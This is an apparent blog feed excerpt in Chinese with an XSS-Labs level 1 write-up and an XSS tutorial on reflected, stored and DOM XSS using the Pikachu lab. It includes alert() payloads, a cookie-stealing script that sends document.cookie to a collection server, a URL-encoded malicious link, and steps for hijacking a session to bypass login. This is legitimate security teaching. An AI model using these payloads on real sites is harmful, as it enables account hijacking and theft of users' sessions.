        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该网页或请求该网页中的内容之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。</p><p>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level1/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level1<span class="token punctuation">.</span>php<span class="token operator">?</span>name<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level1/注入点检测结果.png" alt="注入点检测结果"></center><p>由上述操作可以推断，系统未将对参数中的<code>&lt;</code>、<code>&gt;</code>、<code>\</code>等符号和<code>script</code>、<code>alert</code>等关键字进行过滤，且检测的参数被回显到<code>h2</code>标签中，所以此处存在XSS漏洞。</p></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level2.php?keyword=test"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level1<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level1<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>欢迎用户"</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">"&lt;/h2>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level1.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>由17-18行代码可知：程序将通过<strong>GET方法</strong>得到的参数未经任何转义或过滤直接使用<code>echo</code>回显到页面中，浏览器进行渲染时将参数信息作为<code>javascript</code>脚本执行。</p></li><li><p>所以此关可以成功调用<code>alert()</code>方法的脚本都可以做为payload。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript"># <span class="token function">直接脚本的alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span>方法<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span># <span class="token function">通过事件调用alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span>方法<span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span># 伪协议<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:alert()"</span><span class="token operator">></span>a<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS跨站脚本攻击</title>
      <link href="/2020/10/25/xss-kua-zhan-jiao-ben-gong-ji/"/>
      <url>/2020/10/25/xss-kua-zhan-jiao-ben-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>​        XSS全称（<strong>Cross Site Scripting</strong>）跨站脚本攻击，<strong>是最常见的Web应用程序安全漏洞之一</strong>，位于OWASP top 10 2013/2017年度分别为第三名和第七名，<font color="blue">XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的</font>。</p><p>​        从上面中的一段话，可以得知，XSS属于客户端攻击，<strong>受害者最终是用户</strong>，但特别要注意的是<strong>网站管理人员也属于用户之一</strong>。这就意味着XSS可以进行“<strong>服务端</strong>”攻击，因为管理员要比普通用户的权限大得多，一般管理员都可以对网站进行文件管理，数据管理等操作，而攻击者一般也是靠管理员身份作为“跳板”进行实施攻击。</p><p>​        XSS攻击<strong>最终目的</strong>是在网页中嵌入客户端恶意脚本代码，最常用的攻击代码是<code>javascript</code>语言，但也会使用其它的脚本语言，例如：<code>ActionScript</code>、<code>VBscript</code>。而如今的互联网客户端脚本基本是基于<code>Javascript</code>,所以如果<font color="red">想要深入研究XSS，必须要精通Javascript</font>。</p><p>​        <strong>XSS换句话说，JavaScript能做到什么效果，XSS的胃口就有多大</strong>。这完全不是危言耸听。<code>javascript</code>可以用来获取用户的cookie，弹出窗口，那么存在XSS漏洞的网站，XSS就可以用来盗取用户Cookie，废掉页面，导航到恶意网站！更高端的XSS代码完全可以进行监控你的键盘操作，模仿Windows注销界面，诱导你输入开机密码！而攻击者需要做的仅仅是向你的代码中注入Javascript代码！</p><h1 id="XSS漏洞出现的原因"><a href="#XSS漏洞出现的原因" class="headerlink" title="XSS漏洞出现的原因"></a>XSS漏洞出现的原因</h1><ul><li>参数输入未经过安全过滤</li><li>恶意脚本被输出到网页</li><li>用户的浏览器执行了恶意脚本</li></ul><h1 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h1><ol><li>网络钓鱼，包括盗取各类用户账号</li><li>窃取用户Cookie资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作</li><li>劫持用户浏览器会话，从而执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件等</li><li>强制弹出广告页面、恶意刷流量</li><li>网站挂马，进行恶意操作，例如任意篡改页面信息、非法获取网站信息、删除文件等</li><li>进行大量的客户端攻击，例如DDOS攻击、传播跨站脚本蠕虫等</li><li>获取用户信息，例如用户的浏览记录、真实IP地址、开放的端口等</li><li>结合其他漏洞，如CSRF漏洞，实施进一步操作</li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS危害.png" alt="XSS危害"></center><h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>​        反射型又称为非持久型、参数型跨站脚本。这种类型的跨站脚本是最常见，也是使用最广泛的一种，主要用于<strong>恶意脚本附加到URL地址的参数中</strong>。它<strong>需要欺骗用户自己去点击链接</strong>才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在<strong>搜索页面、输入框、URL参数</strong>处。反射型XSS大多数是用来<strong>盗取用户的Cookie信息</strong>。其攻击流程如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/20201102165714.png" alt="反射型XSS攻击流程"></center><p><strong>程序源码示例</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"Welcome $name&lt;br>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>操作实例</strong>：<font color="red">最基本的XSS漏洞，数据流向：前端 → 后端 → 前端</font></p><ol><li><p>打开pikachu中的反射型<code>XSS(get)</code>，修改文本框的<code>maxlength</code>属性并在文本框中输入：<code>&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;</code>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/反射型XSS(get)操作.png" alt="反射型XSS(get)操作"></center></li><li><p>点击【submit】按钮后，显示结果如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/反射型XSS(get)结果.png" alt="反射型XSS(get)结果"></center></li></ol><h2 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h2><p>​        存储型XSS又称为持久型跨站脚本，比反射型XSS更具威胁性，并且可能影响到Web服务器自身安全。它的代码是存储在服务器中的，如在<strong>个人信息或发表文章等</strong>地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。存储型XSS一般出现在<strong>评论、博客日志等于用户交互处</strong>，这种XSS比较危险，容易造成<strong>蠕虫、盗窃cookie等</strong>。其攻击流程如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/存储型XSS攻击流程.png" alt="存储型XSS攻击流程"></center><p><strong>操作实例</strong>：<font color="red">存储型XSS数据流向为：前端 → 后端 → 数据库 → 后端 → 前端</font></p><ol><li><p>打开pikachu中的存储型XSS，在文本框中输入：<code>&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;</code>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/存储型XSS操作.png" alt="存储型XSS操作"></center></li><li><p>点击【submit】按钮后，显示结果如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/存储型XSS结果.png" alt="存储型XSS结果"></center></li><li><p>再次访问该页面时，显示结果如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/再次访问存储型XSS页面显示结果.png" alt="再次访问存储型XSS页面显示结果"></center></li></ol><h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><p>​        DOM-XSS漏洞是基于文档对象模型（Document Objeet Model，DOM）的一种漏洞，不经过后端，DOM-XSS是通过URL传入参数去控制触发的，其实也属于反射型XSS。  </p><p>​        DOM型的XSS是一些有安全意识的开发者弄出来的，比如说接受参数会做一些过滤，把一些字符转义一下，但是转义之后依然会存在着XSS的情况。常见可能触发DOM-XSS的属性包括：<code>document.referer</code>、<code>window.name</code>、<code>location</code>、<code>innerHTML</code>、<code>documen.write</code>等。  </p><p><strong>注</strong>：</p><ul><li><strong>什么是DOM</strong>:DOM全称是Document Object Model，也就是文档对象模型。我们可以将DOM理解为，一个与系统平台和编程语言无关的接口，程序和脚本可以通过这个接口动态地访问和修改文档内容、结构和样式。当创建好一个页面并加载到浏览器时，DOM就悄然而生，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。故可以使用 Javascript 语言来操作DOM以达到网页的目的。</li><li><a href="https://www.w3school.com.cn/htmldom/index.asp" target="_blank" rel="noopener">HTML DOM教程</a></li></ul><p><strong>操作实例</strong>：<font color="red">DOM-XSS的数据流向为：前端 → 浏览器</font></p><p><strong>DOM型XSS(低危)</strong>：</p><ol><li><p>打开pikachu中的DOM型XSS，在文本框中输入：<code>#&#39; onclick=&quot;alert(1111)&quot;&gt;</code>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/DOM型XSSpayload输入.png" alt="DOM型XSSpayload输入"></center></li><li><p>点击【click me!】按钮后，显示结果如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/DOM型XSS-x单击按钮显示结果.png" alt="DOM型XSS-x单击按钮显示结果"></center></li><li><p>点击链接之后，显示结果如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/DOM型XSS-x单击攻击链接显示结果.png" alt="DOM型XSS-x单击攻击链接显示结果"></center></li></ol><p><strong>DOM型XSS-x(中危)</strong>：</p><ol><li><p>打开pikachu中的DOM型XSS-x，在文本框中输入：<code>#&#39; onclick=&quot;alert(1111)&quot;&gt;</code>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/DOM型XSS-xpayload输入.png" alt="DOM型XSS-xpayload输入"></center></li><li><p>点击按钮后，显示结果如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/DOM型XSS-xpayload输入.png" alt="DOM型XSS-xpayload输入"></center></li><li><p>点击原链接之后，显示结果如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/DOM型XSS-x单击原链接显示结果.png" alt="DOM型XSS-x单击原链接显示结果"></center></li><li><p>点击攻击链接之后，显示结果如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/DOM型XSS-x单击原链接显示结果.png" alt="DOM型XSS-x单击原链接显示结果"></center></li></ol><h1 id="XSS可能存在的地方"><a href="#XSS可能存在的地方" class="headerlink" title="XSS可能存在的地方"></a>XSS可能存在的地方</h1><ul><li>HTML context</li><li>Attribute Context</li><li>URL Context</li><li>Style Context</li><li>Script Context</li></ul><h1 id="XSS测试方法"><a href="#XSS测试方法" class="headerlink" title="XSS测试方法"></a>XSS测试方法</h1><ol><li><strong>工具扫描</strong>：APPscan、AWVS </li><li><strong>手工测试</strong>：Burpsuite、firefox(hackbar)、<a href="https://0kee.360.cn/domXss/" target="_blank" rel="noopener">XSSsniper</a><ul><li>使用手工检测Web应用程序是否存在XSS漏洞时，<font color="red">最重要的是考虑那里有输入，输入的数据在什么地方输出</font>。在进行手工检测XSS时，人毕竟不像软件那样不知疲惫，所以一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS。</li></ul></li></ol><p><strong>手工检测步骤</strong>：</p><p>（1）在目标站点上找到输入点,比如<code>查询接口</code>,<code>留言板</code>等;<br>（2）输入一组”特殊字符+唯一识别字符”,点击提交后,查看返回的源码,是否有做对应的处理;<br>（3）通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合)；提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞。</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="反射型XSS（GET）获取Cookie"><a href="#反射型XSS（GET）获取Cookie" class="headerlink" title="反射型XSS（GET）获取Cookie"></a>反射型XSS（GET）获取Cookie</h2><p><strong>劫持用户会话</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/xss攻击图.jpg" alt="xss攻击图"></center><p>所需条件：</p><ol><li>用户登录的网站存在一个XSS漏洞。</li><li>攻击者建立收集Cookie的平台。</li></ol><p><strong>操作步骤</strong>：</p><ol><li><p>攻击者建立Cookie收集平台。</p><p>pikachu的【管理工具】中有一个【XSS后台】，用此来完成搭建Cookie信息收集平台。</p><ul><li>修改XSS后台的配置文件。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台配置修改.png" alt="XSS后台配置修改"></center><ul><li>XSS后台<strong>Cookie.php</strong>文件解读。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台cookie.php文件解读.png" alt="XSS后台cookie.php文件解读"></center><ul><li>XSS后台<strong>pkxss_cookie_result.php</strong>文件解读。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台pkxss_cookie_result.php文件解读.png" alt="XSS后台pkxss_cookie_result.php文件解读"></center><ul><li>XSS后台初始化欢迎界面。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/xss后台环境界面.png" alt="xss后台环境界面"></center><ul><li>XSS后台安装与初始化界面。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/xss后台安装界面.png" alt="xss后台安装界面"></center><ul><li>XSS后台数据库连接初始化成功界面。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/xss后台数据库初始化完成界面.png" alt="xss后台数据库初始化完成界面"></center><ul><li>XSS后台登录界面。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台登录界面.png" alt="XSS后台登录界面"></center><ul><li>XSS后台管理界面。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台管理界面.png" alt="XSS后台管理界面"></center><ul><li>XSS后台Cookie结果展示界面。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台Cookie结果展示界面.png" alt="XSS后台Cookie结果展示界面"></center></li><li><p><strong>payload</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'http://192.168.19.136:8080/pkxss/xcookie/cookie.php?cookie='</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li><li><p>构造的恶意链接：（恶意信息需要URL格式转码一下以便隐藏）</p><pre class=" language-shell"><code class="language-shell">http://192.168.19.136:8080/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F192.168.19.136%3A8080%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&submit=submit</code></pre></li><li><p>用户访问链接后网页显示的结果。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/百度一下.png" alt="百度一下"></center></li><li><p>截获得到的Cookie信息。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS(GET)获取Cookie.png" alt="XSS(GET)获取Cookie"></center></li></ol><h2 id="反射型XSS-POST-Cookie获取并绕过登录"><a href="#反射型XSS-POST-Cookie获取并绕过登录" class="headerlink" title="反射型XSS(POST)Cookie获取并绕过登录"></a>反射型XSS(POST)Cookie获取并绕过登录</h2><p><strong>劫持用户会话</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/xss攻击图.jpg" alt="xss攻击图"></center><p>所需条件：</p><ol><li>用户登录的网站存在一个XSS漏洞。</li><li>攻击者建立收集Cookie的平台。</li></ol><p><strong>操作步骤</strong>：</p><ol><li><p>攻击者建立Cookie收集平台。</p><p>pikachu的【管理工具】中有一个【XSS后台】，用此来完成搭建Cookie信息收集平台。</p><ul><li>修改XSS后台的配置文件。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台配置修改.png" alt="XSS后台配置修改"></center><ul><li>XSS后台<strong>Cookie.php</strong>文件解读。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台cookie.php文件解读.png" alt="XSS后台cookie.php文件解读"></center><ul><li>XSS后台<strong>pkxss_cookie_result.php</strong>文件解读。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台pkxss_cookie_result.php文件解读.png" alt="XSS后台pkxss_cookie_result.php文件解读"></center><ul><li>XSS后台<strong>post.html</strong>文件解读。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台post.html文件解读.png" alt="XSS后台post.html文件解读"></center><ul><li>XSS后台初始化欢迎界面。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/xss后台环境界面.png" alt="xss后台环境界面"></center><ul><li>XSS后台安装与初始化界面。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/xss后台安装界面.png" alt="xss后台安装界面"></center><ul><li>XSS后台数据库连接初始化成功界面。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/xss后台数据库初始化完成界面.png" alt="xss后台数据库初始化完成界面"></center><ul><li>XSS后台登录界面。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台登录界面.png" alt="XSS后台登录界面"></center><ul><li>XSS后台管理界面。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台管理界面.png" alt="XSS后台管理界面"></center><ul><li>XSS后台Cookie结果展示界面。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台Cookie结果展示界面.png" alt="XSS后台Cookie结果展示界面"></center></li><li><p>用户登录操作环境（存在XSS漏洞的web系统）。</p><ul><li>用户无意双击“post.html”页面。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台post.html文件解读.png" alt="XSS后台post.html文件解读"></center><ul><li><p>用户在登录界面中输入用户名和密码。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/用户登录界面.png" alt="用户登录界面"></center></li><li><p>登录后的主界面。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/用户登录后主界面.png" alt="用户登录后主界面"></center></li></ul></li><li><p>收集平台收到用户的Cookie信息。<font color="red">Cookie中包含用户名和密码信息</font>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/平台收集到的Cookie信息.png" alt="平台收集到的Cookie信息"></center></li><li><p>攻击者组装新的HTTP Header信息，获得系统登录权限。</p><ul><li>BurpSuite拦截访问信息。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/BurpSuite拦包.png" alt="BurpSuite拦包"></center><ul><li>BurpSuite构造新包。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/BurpSuite改包.png" alt="BurpSuite改包"></center><ul><li>放包操作结果（绕过登录）。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/BurpSuite放包结果.png" alt="BurpSuite放包结果"></center></li></ol><h2 id="存储型XSS网络钓鱼"><a href="#存储型XSS网络钓鱼" class="headerlink" title="存储型XSS网络钓鱼"></a>存储型XSS网络钓鱼</h2><p><a href="https://www.cnblogs.com/7-58/p/12324035.html" target="_blank" rel="noopener">XSS网络钓鱼</a></p><p>（没有获得用户名和密码）</p><h2 id="存储型XSS获取键盘记录"><a href="#存储型XSS获取键盘记录" class="headerlink" title="存储型XSS获取键盘记录"></a>存储型XSS获取键盘记录</h2><p>条件：</p><ul><li>允许跨域访问</li></ul><p>执行payload：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/键盘记录payload.png" alt="键盘记录payload"></center><p>键盘输入测试：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/键盘记录测试.png" alt="键盘记录测试"></center><p>键盘记录结果查看：</p><center><img 